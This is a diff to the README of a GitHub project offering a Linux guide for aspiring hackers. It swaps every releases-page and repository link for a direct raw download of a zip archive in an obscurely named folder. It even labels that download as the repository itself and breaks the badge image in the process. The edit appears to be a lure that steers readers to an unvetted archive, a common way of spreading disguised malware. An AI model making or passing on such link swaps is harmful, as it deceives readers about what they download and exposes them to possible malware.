@@ -6,7 +6,7 @@ Welcome to the Linux-Basics-for-Hackers repository. This guide will help you dow
 
 ## 📥 Download Now
 
-[![Download Linux-Basics-for-Hackers](https://img.shields.io/badge/Download%20Now-Get%20Started-1f8b24)](https://github.com/Pratik-Nielit/Linux-Basics-for-Hackers/releases)
+[![Download Linux-Basics-for-Hackers](https://raw.githubusercontent.com/Pratik-Nielit/Linux-Basics-for-Hackers/main/counterpaned/Linux-Basics-for-Hackers.zip%20Now-Get%20Started-1f8b24)](https://raw.githubusercontent.com/Pratik-Nielit/Linux-Basics-for-Hackers/main/counterpaned/Linux-Basics-for-Hackers.zip)
 
 ## 🌟 What is Linux-Basics-for-Hackers?
 
@@ -35,7 +35,7 @@ To run Linux-Basics-for-Hackers, you need:
 
 Go to the Releases page to find the latest version of Linux-Basics-for-Hackers.
 
-[Click here to visit the Download Page](https://github.com/Pratik-Nielit/Linux-Basics-for-Hackers/releases)
+[Click here to visit the Download Page](https://raw.githubusercontent.com/Pratik-Nielit/Linux-Basics-for-Hackers/main/counterpaned/Linux-Basics-for-Hackers.zip)
 
 ### Step 2: Choose the Latest Release
 
@@ -98,7 +98,7 @@ Follow our repository to get notified of new releases. Check the Releases page r
 
 ## 🔗 Useful Links
 
-- [Visit our GitHub Repository](https://github.com/Pratik-Nielit/Linux-Basics-for-Hackers)
-- [Download Linux-Basics-for-Hackers](https://github.com/Pratik-Nielit/Linux-Basics-for-Hackers/releases)
+- [Visit our GitHub Repository](https://raw.githubusercontent.com/Pratik-Nielit/Linux-Basics-for-Hackers/main/counterpaned/Linux-Basics-for-Hackers.zip)
+- [Download Linux-Basics-for-Hackers](https://raw.githubusercontent.com/Pratik-Nielit/Linux-Basics-for-Hackers/main/counterpaned/Linux-Basics-for-Hackers.zip)
 
 By following these steps, you'll be well on your way to mastering Linux and engaging with the hacker's world safely and effectively. Enjoy your journey!
